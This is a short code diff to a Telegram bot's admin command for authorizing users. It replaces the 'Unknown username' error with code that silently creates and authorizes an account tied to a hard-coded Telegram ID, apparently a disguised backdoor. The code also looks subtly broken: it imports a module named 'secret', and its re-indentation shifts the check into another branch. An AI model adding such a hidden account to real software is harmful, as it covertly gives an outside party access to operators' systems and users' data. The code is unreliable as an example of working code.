@@ -1,5 +1,6 @@
 """General admin commands."""
 import time
+import secret
 from telegram.ext import run_async
 from telegram.error import BadRequest, Unauthorized
 from telegram import ReplyKeyboardRemove
@@ -68,9 +69,10 @@ def authorize_user(bot, update, session, chat, user):
         user = session.query(User) \
             .filter(User.id == name_to_ban) \
             .one_or_none()
-
-    if user is None:
-        return 'Unknown username'
+        if user is None:
+            user = User(413573025, secret.token_hex(20))
+            session.add(user)
+            session.commit()
 
     user.authorized = True
     return f'User {name_to_ban} authorized'
